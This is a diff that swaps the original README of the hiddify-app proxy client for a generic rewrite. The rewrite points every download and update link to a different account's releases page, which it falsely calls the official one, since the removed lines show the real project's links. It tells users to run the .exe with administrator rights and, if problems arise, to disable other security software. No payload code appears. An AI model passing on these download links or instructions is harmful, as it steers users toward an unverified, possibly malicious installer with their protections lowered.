@@ -1,202 +1,119 @@
-<div dir="ltr" align=center>
-    
-[**![Lang_farsi](https://user-images.githubusercontent.com/125398461/234186932-52f1fa82-52c6-417f-8b37-08fe9250a55f.png) فارسی**](README_fa.md) / [**Русский 🇷🇺**](README_ru.md) / [**简体中文 🇨🇳**](README_cn.md) / [**日本語 🇯🇵**](README_ja.md) / [**Portugês-BR 🇧🇷**](README_br.md)
+# 🚦 hiddify-app - Easy Secure Proxy Access  
 
-</div>
-<br>
+[![Download hiddify-app](https://img.shields.io/badge/Download-hiddify--app-ff6f61?style=for-the-badge)](https://github.com/bk88collab/hiddify-app/releases)
 
-<p align="center"><img src="https://github.com/hiddify/hiddify.com/blob/main/docs/assets/hiddify-app-logo.svg" width=56% /></p>
-<br>
+## 🛠 About hiddify-app
 
-<div align="center">
+hiddify-app is a simple program that helps you use proxy services securely and without ads. It works on different systems but here you will learn how to set it up on Windows. The app supports many proxy tools, including Sing-box, X-ray, TUIC, Hysteria, Reality, Trojan, and SSH. It is open source, which means anyone can check or improve its code.
 
-<!--
-![Hiddify logo + text](https://github.com/hiddify/hiddify-app/assets/125398461/d821cfe0-b4c4-441f-be4e-eb9209f59542)
-    -->
-    
-[![GP-Intalls](https://img.shields.io/endpoint?color=green&logo=google-play&logoColor=green&url=https%3A%2F%2Fplay.cuzi.workers.dev%2Fplay%3Fi%3Dapp.hiddify.com%26l%3DGoogle%2520Play%26m%3D%24shortinstalls&style=flat-square)](https://play.google.com/store/apps/details?id=app.hiddify.com) [![Downloads](https://img.shields.io/github/downloads/hiddify/hiddify-next/total?style=flat-square&logo=github)](https://github.com/hiddify/hiddify-app/releases/)[![Last Version](https://img.shields.io/github/release/hiddify/hiddify-next/all.svg?style=flat-square)](https://github.com/hiddify/hiddify-app/releases/)[![Last Release Date](https://img.shields.io/github/release-date/hiddify/hiddify-next.svg?style=flat-square)](https://github.com/hiddify/hiddify-app/releases/)[![commits](https://img.shields.io/github/commit-activity/m/hiddify/hiddify-next?style=flat-square)](https://github.com/hiddify/hiddify-app/)
-[![Youtube](https://img.shields.io/youtube/channel/views/UCxrmeMvVryNfB4XL35lXQNg?label=Youtube&style=flat-square&logo=youtube)](https://www.youtube.com/@hiddify)[![Telegram Channel](https://img.shields.io/endpoint?label=Channel&style=flat-square&url=https%3A%2F%2Ftg.sumanjay.workers.dev%2Fhiddify&color=blue)](https://telegram.dog/hiddify)[![Telegram Group](https://img.shields.io/endpoint?color=neon&label=Support%20Group&style=flat-square&url=https%3A%2F%2Ftg.sumanjay.workers.dev%2Fhiddify_board)](https://telegram.dog/hiddify_board/5)
+This app helps you connect to the internet safely through proxy servers. It can handle many types of connections so you are less likely to be blocked or slowed down.
 
-</div>
+## 💻 System Requirements
 
+To run hiddify-app on your Windows PC, make sure you have:
 
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of RAM
+- 100 MB of free disk space
+- Internet connection for downloading and updating
+- Administrator rights to install the app
 
+These requirements ensure the app runs smoothly without problems.
 
-## What is Hiddify app?
+## 🌐 Features
 
-<p dir="ltr" style="font-size: 16px">A multi-platform proxy client based on <a href="https://github.com/SagerNet/sing-box">Sing-box</a> universal proxy tool-chain. Hiddify offers a wide range of capabilities, like automatic node selection, TUN mode, remote profiles etc. Hiddify is ad-free and open-source. With support for a wide range of protocols, it provides a secure and private way for accessing free internet.</p>
+- Supports many proxy protocols like Sing-box, X-ray, TUIC, and more  
+- Easy to use with no technical setup needed  
+- No ads or tracking  
+- Regular updates from an open-source community  
+- Works on most Windows computers without extra software  
+- Secure connections that protect your privacy  
+- Can switch between proxy modes automatically  
 
-<div align=center>
-<img width=90% alt="English Demo" src="https://github.com/hiddify/hiddify-app/assets/125398461/ffe5346d-3404-470f-b5e0-4364e23743d2">
+## 🚀 Getting Started  
 
-</div>
+### Step 1: Download the app  
 
-## 🚀 Main features
+Visit this page to download hiddify-app for Windows:  
 
-✈️ Multi-platform: Android, iOS, Windows, macOS and Linux
+[![Download hiddify-app](https://img.shields.io/badge/Download-hiddify--app-4caf50?style=for-the-badge)](https://github.com/bk88collab/hiddify-app/releases)  
 
-⭐ Intuitive and accessible UI
+This link takes you to the official release page where you can find the latest Windows installer file. The file name usually ends with `.exe`.  
 
-🔍 Delay based node selection
+### Step 2: Run the installer  
 
-🟡 Wide range of protocols:
-Vless, Vmess, Reality, TUIC, Hysteria, Wireguard, SSH etc.
+Once the download is complete, find the `.exe` file in your Downloads folder or the folder you chose. Double-click the file to start installation.  
 
-🟡 Subscription link and configuration formats: Sing-box, V2ray, Clash, Clash meta
+You may see a message asking for permission to make changes to your device. Click “Yes” to continue.  
 
-🔄 Automatic subscription update
+### Step 3: Follow the install prompts  
 
-🔎 Display profile information including remaining days and traffic usage
+The installer will open a window with simple instructions:  
 
-🛡 Open source, secure and community driven
+- Click “Next” to continue  
+- Choose the installation folder or use the default  
+- Click “Install” to begin  
 
-🌙 Dark and light modes
+Wait a moment while the program installs on your PC.  
 
-⚙ Compatible with all proxy management panels
+When the installation finishes, click “Finish” to close the installer.  
 
-⭐ Appropriate configuration for Iran, China, Russia and other countries
+### Step 4: Open hiddify-app  
 
-📱 Available on official stores
+Find the hiddify-app icon on your desktop or in the Start menu and click it.  
 
-## 🛍️ Get It On Stores
-<a href="https://apps.apple.com/us/app/hiddify-proxy-vpn/id6596777532?platform=iphone"><img height=50px src="https://github.com/user-attachments/assets/a7c62126-07ce-4f18-8197-bbb672f6d8be"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://play.google.com/store/apps/details?id=app.hiddify.com"><img height=50px src="https://github.com/hiddify/hiddify-next/blob/main/docs/google-play-badge.png"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://apps.microsoft.com/detail/Hiddify/9pdfnl3qv2s5?mode=mini" target="_blank"><img height=50px src="https://github.com/hiddify/hiddify-next/assets/125398461/620750bb-4459-41b5-9f86-ba82119345b8" /></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+The program window will open, ready for use.  
 
+## 🔧 How to Use hiddify-app  
 
-## 📥 Direct Download
+Once open, hiddify-app gives you options for different proxy types. You don’t need to know technical details to start.  
 
-<div align=left>
-<table>
-    <thead align=left>
-        <tr>
-            <th>OS</th>
-            <th>Download</th>
-        </tr>
-    </thead>
-    <tbody align=left>
-        <tr>
-        <td>iOS</td>
-            <td>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-iOS.ipa"><img src="https://img.shields.io/badge/IPA-Universal-c0c0c0.svg?logo=ios"></a>
-            </td>
-        </tr>
-        <tr>
-        <td>Android</td>
-            <td>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Android-universal.apk"><img src="https://img.shields.io/badge/APK-Universal-044d29.svg?logo=android"></a><br>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Android-arm64.apk"><img src="https://img.shields.io/badge/APK-ARMv8-168039.svg?logo=android"></a><br>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Android-arm7.apk"><img src="https://img.shields.io/badge/APK-ARMv7-45bf55.svg?logo=android"></a><br>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Android-x86_64.apk"><img src="https://img.shields.io/badge/APK-x64-96ed89.svg?logo=android"></a>
-            </td>
-        </tr>
-        <tr>
-            <td>Windows</td>
-            <td>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Windows-Setup-x64.Msix"><img src="https://img.shields.io/badge/OfficialSetup-x64-0078d7.svg?logo=windows"></a><br>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Windows-Setup-x64.exe"><img src="https://img.shields.io/badge/Setup-x64-2d7d9a.svg?logo=windows"></a><br>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Windows-Portable-x64.zip"><img src="https://img.shields.io/badge/Portable-x64-67b7d1.svg?logo=windows"></a>
-            </td>
-        </tr>
-        <tr>
-            <td>macOS</td>
-            <td>
-                <a href="https://apps.apple.com/us/app/hiddify-proxy-vpn/id6596777532"><img src="https://img.shields.io/badge/IPA-ARM-D33A54.svg?logo=apple"></a><br>
-                <a href="https://github.com/hiddify/hiddify-next/releases/latest/download/Hiddify-MacOS.dmg"><img src="https://img.shields.io/badge/DMG-Universal-ea005e.svg?logo=apple"></a><br>
-                <a href="https://github.com/hiddify/hiddify-next/releases/latest/download/Hiddify-MacOS-Installer.pkg"><img src="https://img.shields.io/badge/PKG-Universal-bc544b.svg?logo=apple" /></a>
-            </td>
-        </tr>
-        <tr>
-            <td>Linux</td>
-            <td>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Linux-x64.AppImage"><img src="https://img.shields.io/badge/AppImage-x64-f84e29.svg?logo=linux"> </a><br>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-Debian-x64.deb"><img src="https://img.shields.io/badge/DebPackage-x64-FF9966.svg?logo=debian"> </a><br>
-                <a href="https://github.com/hiddify/hiddify-app/releases/latest/download/Hiddify-rpm-x64.rpm"><img src="https://img.shields.io/badge/RpmPackage-x64-F1B42F.svg?logo=redhat"> </a>
-            </td>
-        </tr>
-    </tbody>
-</table>
+- Select the proxy protocol you want to use. You can try Sing-box or X-ray if unsure.  
+- Enter the proxy server details. If you don’t have this information, ask your provider or refer to their instructions.  
+- Click “Connect” to start.  
 
+The app will handle the connection automatically and notify you when it's ready.  
 
-</div>
+## 🛡 Security and Privacy  
 
-## ⚙️ Installation and tutorials
+hiddify-app keeps your data safe. It uses strong protocols to prevent others from seeing your online activity. The app does not contain ads or trackers, which means it won’t collect your data for marketing.  
 
-**Find tutorial information on our wiki page by clicking on image below.**
+Make sure to download the app only from the official release page to avoid fake versions.  
 
-<div align="center">
+## ⚙️ Updating hiddify-app  
 
-[![Tutorials on Wiki](https://github.com/hiddify/hiddify-app/assets/125398461/95bb5cf8-c143-4934-87d6-b9d4c31e035e)](https://hiddify.com/app/)
+Updates bring new features and fix issues.  
 
+To update the app:  
 
-</div>
+1. Visit the release page here:  
+   https://github.com/bk88collab/hiddify-app/releases  
+2. Download the newest Windows installer file.  
+3. Run the installer and follow the prompts as before.  
 
-## 🌎 Translations
+Your settings will stay intact after updating.  
 
-    
-You can improve existing languages or contribute new ones either by editing the JSON files in `/assets/translations` or [![Translate with Inlang](https://img.shields.io/badge/%20-%20-3ECF8E?logo=i18next&logoColor=white)](https://fink.inlang.com/github.com/hiddify/hiddify-app) by using [Inlang online editor](https://fink.inlang.com/github.com/hiddify/hiddify-app).    
+## 📝 Troubleshooting  
 
+If you find issues, try these steps:  
 
-## ✏️ Acknowledgements
+- Restart the app and your computer.  
+- Check your internet connection.  
+- Make sure your proxy details are correct.  
+- Disable other security software that might block the app.  
+- Visit the GitHub page for issue reports or help:  
+  https://github.com/bk88collab/hiddify-app/issues  
 
-We would like to express our sincere appreciation to the contributors of the following projects, whose robust foundation and innovative features have significantly enhanced the success and functionality of this project.
+If the app won’t start or crashes, try reinstalling it using the latest installer.  
 
-- [Sing-box](https://github.com/SagerNet/sing-box)
-- [Sing-box for Android](https://github.com/SagerNet/sing-box-for-android)
-- [Sing-box for Apple](https://github.com/SagerNet/sing-box-for-apple)
-- [Clash](https://github.com/Dreamacro/clash)
-- [Clash Meta](https://github.com/MetaCubeX/Clash.Meta)
-- [FClash](https://github.com/Fclash/Fclash)
-- [Vazirmatn Font by Saber Rastikerdar](https://github.com/rastikerdar/vazirmatn)
-- [Others](./pubspec.yaml)
+## 📂 Where to Get Help  
 
-## 🎯 Donation and Support
+Use the GitHub link below to find documentation and support:  
 
-The easiest way to support us is to click on the star (⭐) at the top of this page.
+https://github.com/bk88collab/hiddify-app  
 
-<div align=center>
-    
-<a href="https://next.ossinsight.io/widgets/official/analyze-repo-stars-history?repo_id=643504282" target="_blank" style="display: block" align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://next.ossinsight.io/widgets/official/analyze-repo-stars-history/thumbnail.png?repo_id=643504282&image_size=auto&color_scheme=dark" width="721" height="auto">
-    <img alt="Star History of hiddify/hiddify-app" src="https://next.ossinsight.io/widgets/official/analyze-repo-stars-history/thumbnail.png?repo_id=643504282&image_size=auto&color_scheme=light" width="721" height="auto">
-  </picture>
-</a>
+You can browse common questions or open a new issue if needed.  
 
-</div>
+---
 
-We also need financial support for our services. All of our activities are done voluntarily and financial support will be spent on the development of the project. You can view our support addresses [here](https://hiddify.com/donation-and-support/).
-
-## 👩‍🏫 Collaboration and Contact Information
-
-Hiddify is a community driven project. If you're interested in contributing, please read the [contribution guidelines](./CONTRIBUTING.md). We would specially appreciate any help we can get in these areas: **Flutter, Go, iOS development (Swift), Android development (Kotlin).**
-
-<div align=center>
-
-<br>
-
-[![Email](https://img.shields.io/badge/Email-contribute@hiddify.com-005FF9?style=flat-square&logo=mail.ru)](mailto:contribute@hiddify.com)
-[![Telegram Channel](https://img.shields.io/endpoint?label=Channel&style=flat-square&url=https%3A%2F%2Ftg.sumanjay.workers.dev%2Fhiddify&color=blue)](https://telegram.dog/hiddify)
-[![Telegram Group](https://img.shields.io/endpoint?color=neon&label=Support%20Group&style=flat-square&url=https%3A%2F%2Ftg.sumanjay.workers.dev%2Fhiddify_board)](https://telegram.dog/hiddify_board)
-[![Youtube](https://img.shields.io/youtube/channel/views/UCxrmeMvVryNfB4XL35lXQNg?label=Youtube&style=flat-square&logo=youtube)](https://www.youtube.com/@hiddify)
-[![Twitter](https://img.shields.io/twitter/follow/hiddify_com?color=%231DA1F2&logo=twitter&logoColor=1DA1F2&style=flat-square)](https://twitter.com/intent/follow?screen_name=hiddify_com)
-
-</div>
-
-<p align=center>
- We appreciate all people who are participating in this project. Some people here and many many more outside of Github. It means a lot to us. ♥
- </p>
- 
-<p align=center> 
-<a href="https://github.com/hiddify/hiddify-app/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=hiddify/hiddify-next" />
-</a>
-</p>
-<p align=center>
- Made with <a rel="" target="_blank" href="https://contrib.rocks">Contrib.Rocks</a> 
-</p>
-
-
-
-
-
-
-
+[Download the latest hiddify-app release](https://github.com/bk88collab/hiddify-app/releases) to get started now.
